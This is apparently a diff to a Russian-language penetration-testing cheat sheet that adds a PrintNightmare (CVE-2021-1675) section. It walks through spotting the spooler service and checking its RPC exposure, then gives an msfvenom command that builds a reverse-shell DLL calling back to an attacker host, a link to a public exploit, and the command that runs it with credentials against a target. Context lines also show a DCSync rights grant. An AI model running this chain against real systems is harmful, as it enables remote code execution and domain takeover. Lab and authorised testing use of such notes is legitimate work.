@@ -726,3 +726,14 @@ Add-ObjectACL -PrincipalIdentity max -Credential $cred -Rights DCSync
        wevtutil qe Security /rd:true /f:text | Select-String "/user"
         Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
         
+# Уязвимость в Windows Print Spooler (PrintNightmare)
+
+    Для поиска уязвимости стоит обратиться к списку процессов. В списке процессов стоит обратить внимание на службу печати — spoolsv:
+
+    Далее следует проверить, имеется ли доступ к данному сервису по TCP порту. Для этого можно удобно использовать утилиту обращения к RPC сервисам Windows: rpcdump.py
+
+    rpcdump.py @10.10.10.175 | egrep 'MS-RPRN|MS-PAR'
+
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=1337 -f dll -o /tmp/print.dll
+      https://github.com/cube0x0/CVE-2021-1675 (Эксплойт)
+    python3 ./CVE-2021-1675.py example.local/Alex:HappyHacking@192.168.0.134 '\\192.168.0.177\share\print.dll'
